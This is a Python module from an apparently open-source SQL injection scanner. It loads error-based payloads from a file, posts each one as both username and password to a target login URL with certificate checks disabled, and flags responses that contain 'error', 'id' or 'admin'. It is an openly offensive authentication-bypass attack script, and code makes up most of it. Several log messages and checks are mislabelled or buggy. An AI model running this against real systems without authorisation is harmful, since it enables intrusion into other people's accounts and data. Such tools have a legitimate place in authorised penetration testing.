import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import inspect
import traceback
from bs4 import BeautifulSoup
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import SQLJNG_result_report
from lib.result.Results import safe_SQLJNG_result
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from logger.sqljlog import logger as sqljlog
from lib.Attacktype.Attacks import HeaderAttacks

init()

attack_type = "Error Based SQL Injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

ack = None

capturesERRBASED = []
pattern = r"\berror\b"
htmlpattern = r"\bid\b"


__prioroty__ = PRIORITY.HIGH
__hramfull__ = HARMFULL.HIGH
  
async def Error_based_inj(urls):
    """This is for error based SQL injection. You can realize to the SQL structure by this Injection if it works."""
    try: 
        global pattern,htmlpattern 
        done = False 
        filename = "Error_based.txt" 
        current_directory = os.path.dirname(os.path.abspath((__file__)))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file: 
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows) 
            logger.info(str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the payload to the website? ")
                logger.info(f"The website:{urls} is up with the status code:{req.status_code}")

                if ask.lower() == "y":
                    sqljlog.info(f"Testing:{HeaderAttacks.ERROR_BASED_SQL_INJECTION_HEADER.value}")

                    for line in sorted_payload.split("\n"):
                        params = {
                            "username": line,
                            "password": line
                        }
                        
                        ack = requests.post(url=urls, data=params,verify=False)
                        logger.info(f"Testing parameter:{line} on the target...")
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error, keyword:{line}")
                            Detect(ack.text)
                            html_response.push(ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                        
                        if htmlVULN:
                            logger.info(f"Could find error parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info("Could find parameter id, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                        
                        if errword:
                            logger.info("Could find parameter error, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text) 
                            
                    if ack.status_code == 302:
                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")


                        done = True
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                        Detect(ack.text)
                        await asyncio.sleep(3)
                        html_response.push(ack.text)
                        
                        
            else:
                logger.info(f"Could not connect to the target:{urls} ")

        
    
        
 
        
    except KeyboardInterrupt:
        pass
        

        raise SystemExit
    except UnboundLocalError:
        pass

    except SystemExit:
        raise
    except Exception as e:
        logger.error(f"Error: {e}")
    
        

    finally:
        logger.info(f"Done with the injection test to the target:{urls}")
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)
      
# asyncio.run(Error_based_inj("http://testphp.vulnweb.com/artists.php"))